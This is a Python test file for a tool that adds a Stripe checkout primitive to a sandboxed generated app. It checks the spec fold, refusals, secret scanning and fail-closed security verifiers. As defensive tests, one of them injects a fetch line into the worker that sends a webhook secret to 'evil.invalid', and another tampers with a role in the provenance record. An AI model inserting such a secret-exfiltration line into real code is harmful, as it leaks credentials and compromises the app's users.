"""Epic F4.1 SEAM — adding the `stripe` primitive through `app_add_primitive`.

Covers, through the real tool interface against an in-memory sandbox, on a
records app:
  * the happy fold path: spec validated, pricing section + entitlement role
    folded into .disco/appspec.json, tree regenerated with a runtime-gated
    checkout surface, template_only tier note carried in the success message;
  * provenance: .disco/primitives/stripe.json records id/tier/spec;
  * an identical re-apply is a loud no-op refusal (never a hollow success);
  * an invalid spec (unknown key / bad flag slug) is refused WITH the expected
    schema carried (self-recovering);
  * the regenerated tree contains the Disco-owned Worker webhook/checkout routes
    but no secret-shaped string or browser-side host-service binding;
  * the fail-closed registration invariants: template-only output requires both
    a static checker and an injected host live-verifier id.
"""

from __future__ import annotations

import json

from disco.core.appkit import (
    APPSPEC_RELPATH,
    DESIGNSPEC_RELPATH,
    load_app_spec_from_bytes,
    load_design_spec_from_bytes,
)
from disco.core.appkit.primitives import (
    PrimitiveVerifyResult,
    VerifyCheck,
    get_primitive,
    required_security_primitives,
)
from disco.core.appkit.stripe_primitive import (
    PAYMENTS_PENDING_HELPER,
    PAYMENTS_PENDING_LABEL,
    STRIPE_PRICING_SECTION_ID,
    STRIPE_PRIMITIVE_ID,
    stripe_verify,
)
from disco.tools.anatomy import Capability, ToolContext
from disco.tools.builtin.app_kit import (
    AppAddPrimitiveArgs,
    AppAddPrimitiveTool,
    AppCreateArgs,
    AppCreateTool,
)
from disco.tools.builtin.verify_appkit_app import VerifyAppKitAppTool
from tool_fakes import FakeSandboxInstance

_SPEC = {
    "plan_name": "Pro",
    "price_display": "$9/mo",
    "entitlement_flag": "pro_member",
    "success_message": "Welcome to Pro — your workspace is unlocked.",
    "features": ["Unlimited records", "Priority support"],
}

_PROVENANCE_RELPATH = f".disco/primitives/{STRIPE_PRIMITIVE_ID}.json"


def _ctx(sbx: FakeSandboxInstance) -> ToolContext:
    return ToolContext(
        sandbox=sbx,
        workspace_path=".",
        timeout_s=30,
        capabilities={Capability.FILESYSTEM},
        owner_id="local",
        conversation_id="conv-f41-stripe",
    )


async def _create_records_app(sbx: FakeSandboxInstance):
    result = await AppCreateTool().run(
        AppCreateArgs(recipe_id="editorial-ledger", primitive_id="records", brief="Shift Manager"),
        _ctx(sbx),
    )
    if result.success:
        # Stripe composes only with an auth-capable records app.  The records
        # default is deliberately public, so this fixture supplies its ordinary
        # (non-payment) member role before applying the add-on.
        app_data = json.loads(sbx._fs[APPSPEC_RELPATH])
        app_data["roles"] = ["member"]
        sbx._fs[APPSPEC_RELPATH] = json.dumps(app_data).encode()
    return result


async def _add_stripe(sbx: FakeSandboxInstance, spec: dict):
    return await AppAddPrimitiveTool().run(
        AppAddPrimitiveArgs(primitive_id=STRIPE_PRIMITIVE_ID, spec=spec), _ctx(sbx)
    )


def _tree(sbx: FakeSandboxInstance) -> dict[str, str]:
    return {path: data.decode("utf-8") for path, data in sbx._fs.items()}


# ---- the happy fold path ----------------------------------------------------------


async def test_add_stripe_to_records_app_folds_section_role_and_provenance():
    sbx = FakeSandboxInstance()
    created = await _create_records_app(sbx)
    assert created.success is True, created.content

    out = await _add_stripe(sbx, dict(_SPEC))
    assert out.success is True, out.content
    assert out.structured is not None
    assert out.structured["tier"] == "template_only"
    assert out.structured["primitive_id"] == STRIPE_PRIMITIVE_ID
    # the template_only spec-only note is carried to the model
    assert "Disco-owned" in out.content
    assert "do not hand-edit" in out.content

    # the AppSpec was re-saved with the folded pricing section + entitlement role
    app_data = json.loads(sbx._fs[APPSPEC_RELPATH])
    assert "pro_member" in app_data["roles"]
    assert app_data["stripe"]["plan_selector"] == "pro_member"
    assert app_data["stripe"]["entitlement_flag"] == "pro_member"
    assert app_data["stripe"]["success_message"] == _SPEC["success_message"]
    assert app_data["stripe"]["app_binding"].startswith("app_")
    stripe_sections = [
        s
        for page in app_data["pages"]
        for s in page.get("sections", [])
        if s["id"] == STRIPE_PRICING_SECTION_ID
    ]
    assert len(stripe_sections) == 1
    section = stripe_sections[0]
    assert section["kind"] == "pricing"
    assert section["content"]["heading"] == "Pro"
    assert section["content"]["subheading"] == "$9/mo"
    assert section["content"]["items"] == ["Unlimited records", "Priority support"]

    # the folded spec is VISIBLE in the regenerated tree, in the PENDING state
    content_ts = sbx._fs["src/generated/content.ts"].decode("utf-8")
    assert "Pro" in content_ts
    assert "$9/mo" in content_ts
    assert "Unlimited records" in content_ts
    assert PAYMENTS_PENDING_LABEL in content_ts
    assert PAYMENTS_PENDING_HELPER in content_ts

    # provenance record persisted (WO-A3.2's gate will read this)
    record = json.loads(sbx._fs[_PROVENANCE_RELPATH])
    assert record["primitive_id"] == STRIPE_PRIMITIVE_ID
    assert record["tier"] == "template_only"
    assert record["spec"] == _SPEC


async def test_regenerated_tree_has_runtime_gated_checkout_without_secrets():
    sbx = FakeSandboxInstance()
    assert (await _create_records_app(sbx)).success is True
    assert (await _add_stripe(sbx, dict(_SPEC))).success is True

    tree = _tree(sbx)
    for path, contents in tree.items():
        lowered = path.lower()
        assert "checkout" not in lowered, f"payments-named path emitted: {path}"
        assert "webhook" not in lowered, f"payments-named path emitted: {path}"
        if "stripe" in lowered:
            # exactly two legitimately stripe-named paths exist: the provenance
            # record (spec bookkeeping under .disco/) and the pricing-card section
            # component named after the `stripe_pricing` section id — never a
            # route/client/api file
            assert lowered == _PROVENANCE_RELPATH or (
                path.startswith("src/components/") and "pricing" in lowered
            ), f"unexpected payments-named path emitted: {path}"
        for marker in ("sk_live", "sk_test", "whsec_"):
            assert marker not in contents, f"secret-shaped marker {marker!r} in {path}"

    # The browser sees only relative Worker routes.  Host-bus credentials remain
    # Worker-only, and the CTA stays disabled until the runtime-ready probe passes.
    stripe_components = [
        contents
        for path, contents in tree.items()
        if path.startswith("src/components/") and 'data-appkit-section="stripe_pricing"' in contents
    ]
    assert len(stripe_components) == 1
    component = stripe_components[0]
    assert "ctaLabel" not in component
    assert "postJson" not in component
    assert "<form" not in component
    assert 'fetch("/api/stripe/status"' in component
    assert 'fetch("/api/stripe/checkout"' in component
    assert "disabled={!ready || busy}" in component
    assert "DISCO_SVC_" not in component
    worker = tree["worker/index.ts"]
    assert 'svc(env, "payments.checkout"' in worker
    assert 'rawPath === "/api/stripe/webhook"' in worker
    assert "STRIPE_WEBHOOK_SECRET?: string" in worker
    assert "worker/disco-client.ts" in tree


# ---- refusals ----------------------------------------------------------------------


async def test_identical_reapply_is_loud_noop():
    sbx = FakeSandboxInstance()
    assert (await _create_records_app(sbx)).success is True
    assert (await _add_stripe(sbx, dict(_SPEC))).success is True
    again = await _add_stripe(sbx, dict(_SPEC))
    assert again.success is False
    assert "no-op" in again.content
    # a CHANGED spec re-applies fine (the fold is visible per field)
    changed = await _add_stripe(sbx, {**_SPEC, "price_display": "$19/mo"})
    assert changed.success is True, changed.content
    app_data = json.loads(sbx._fs[APPSPEC_RELPATH])
    stripe_sections = [
        s
        for page in app_data["pages"]
        for s in page.get("sections", [])
        if s["id"] == STRIPE_PRICING_SECTION_ID
    ]
    assert len(stripe_sections) == 1  # replaced, never duplicated
    assert stripe_sections[0]["content"]["subheading"] == "$19/mo"


async def test_invalid_spec_refused_with_schema():
    sbx = FakeSandboxInstance()
    assert (await _create_records_app(sbx)).success is True
    # unknown key (extra=forbid) — e.g. trying to smuggle a machine price object
    out = await _add_stripe(sbx, {**_SPEC, "price_id": "price_123"})
    assert out.success is False
    assert "invalid 'stripe' spec" in out.content
    assert "Expected schema" in out.content
    assert "plan_name" in out.content
    # entitlement_flag must be a role slug
    out2 = await _add_stripe(sbx, {**_SPEC, "entitlement_flag": "Pro-Member"})
    assert out2.success is False
    # nothing was persisted by the refusals
    assert _PROVENANCE_RELPATH not in sbx._fs


# ---- fail-closed registration invariants (what the WO-A3 gate keys on) ------------


async def test_registration_requires_static_and_host_live_verifiers():
    prim = get_primitive(STRIPE_PRIMITIVE_ID)
    assert prim is not None
    assert prim.tier == "template_only"
    assert prim.verify is stripe_verify
    assert prim.live_verify_id == "stripe.security.v1"
    assert prim.security_metadata_field == "stripe"
    # The webhook is an inbound Worker route, not an outbound host capability.
    assert tuple(hs.name for hs in prim.host_contract) == (
        "payments.checkout",
        "payments.ready",
    )


async def _stripe_gate_inputs():
    sbx = FakeSandboxInstance()
    assert (await _create_records_app(sbx)).success is True
    assert (await _add_stripe(sbx, dict(_SPEC))).success is True
    app = load_app_spec_from_bytes(sbx._fs[APPSPEC_RELPATH])
    design = load_design_spec_from_bytes(sbx._fs[DESIGNSPEC_RELPATH])
    return sbx, app, design, _tree(sbx)


async def test_appspec_metadata_makes_stripe_security_gate_mandatory_without_provenance():
    _, app, design, tree = await _stripe_gate_inputs()
    required = required_security_primitives(app)
    assert tuple(item.id for item in required) == (STRIPE_PRIMITIVE_ID,)

    del tree[_PROVENANCE_RELPATH]
    result = stripe_verify(app, design, tree)
    checks = {item.name: item for item in result.checks}
    assert result.ok is False
    assert checks["stripe_provenance_binding"].passed is False
    assert "missing" in checks["stripe_provenance_binding"].evidence


async def test_mismatched_provenance_cannot_authorize_manual_stripe_metadata():
    _, app, design, tree = await _stripe_gate_inputs()
    record = json.loads(tree[_PROVENANCE_RELPATH])
    record["spec"]["entitlement_flag"] = "attacker_role"
    tree[_PROVENANCE_RELPATH] = json.dumps(record)
    result = stripe_verify(app, design, tree)
    check = next(item for item in result.checks if item.name == "stripe_provenance_binding")
    assert result.ok is False
    assert check.passed is False
    assert "differs" in check.evidence


async def test_tampered_worker_secret_exfil_fails_trusted_bytes_and_secret_scan():
    _, app, design, tree = await _stripe_gate_inputs()
    tree["worker/index.ts"] += '\nfetch("https://evil.invalid/?k=whsec_stolen_value");\n'
    result = stripe_verify(app, design, tree)
    checks = {item.name: item for item in result.checks}
    assert result.ok is False
    assert checks["stripe_trusted_tree"].passed is False
    assert "worker/index.ts" in checks["stripe_trusted_tree"].evidence
    assert checks["stripe_static_secret_absence"].passed is False


async def test_host_live_dispatch_is_mandatory_and_result_consistent():
    _, app, design, tree = await _stripe_gate_inputs()
    prim = required_security_primitives(app)[0]
    tool = VerifyAppKitAppTool()

    missing = await tool._security_primitive_checks(
        _ctx(FakeSandboxInstance()), prim, app, design, tree
    )
    assert missing[-1]["name"] == "primitive_live:stripe.security.v1"
    assert missing[-1]["passed"] is False
    assert "not wired" in missing[-1]["evidence"]

    calls: list[str] = []

    async def live_ok(live_id, live_app, live_design, live_tree):
        calls.append(live_id)
        assert live_app is app and live_design is design and live_tree is tree
        return PrimitiveVerifyResult(
            ok=True,
            detail="five live exploit checks passed",
            checks=tuple(
                VerifyCheck(name, True, "live proof passed")
                for name in (
                    "forged_signature_rejected",
                    "replay_deduped",
                    "secret_absence",
                    "restricted_key_only",
                    "price_injection_refused",
                )
            ),
        )

    live_ctx = _ctx(FakeSandboxInstance()).model_copy(update={"primitive_live_verifier": live_ok})
    passed = await tool._security_primitive_checks(live_ctx, prim, app, design, tree)
    assert calls == ["stripe.security.v1"]
    assert all(item["passed"] for item in passed)

    async def inconsistent(*_args):
        return PrimitiveVerifyResult(
            ok=True,
            detail="claims pass",
            checks=(VerifyCheck("forgery", False, "actually failed"),),
        )

    inconsistent_ctx = _ctx(FakeSandboxInstance()).model_copy(
        update={"primitive_live_verifier": inconsistent}
    )
    refused = await tool._security_primitive_checks(inconsistent_ctx, prim, app, design, tree)
    assert refused[-1]["passed"] is False
    assert "inconsistent" in refused[-1]["evidence"]

    async def empty(*_args):
        return PrimitiveVerifyResult(ok=True, detail="", checks=())

    empty_ctx = _ctx(FakeSandboxInstance()).model_copy(update={"primitive_live_verifier": empty})
    empty_result = await tool._security_primitive_checks(empty_ctx, prim, app, design, tree)
    assert empty_result[-1]["passed"] is False
    assert "empty" in empty_result[-1]["evidence"]

    async def unknown_checks(*_args):
        return PrimitiveVerifyResult(
            ok=True,
            detail="one unrelated check",
            checks=(VerifyCheck("unrelated", True, "not the Stripe contract"),),
        )

    unknown_ctx = _ctx(FakeSandboxInstance()).model_copy(
        update={"primitive_live_verifier": unknown_checks}
    )
    unknown = await tool._security_primitive_checks(unknown_ctx, prim, app, design, tree)
    assert unknown[-1]["passed"] is False
    assert "unknown/missing" in unknown[-1]["evidence"]

    async def explodes(*_args):
        raise RuntimeError("must not leak host exception text")

    exception_ctx = _ctx(FakeSandboxInstance()).model_copy(
        update={"primitive_live_verifier": explodes}
    )
    exception = await tool._security_primitive_checks(exception_ctx, prim, app, design, tree)
    assert exception[-1]["passed"] is False
    assert exception[-1]["evidence"] == ("host live verifier raised RuntimeError (fail-closed).")
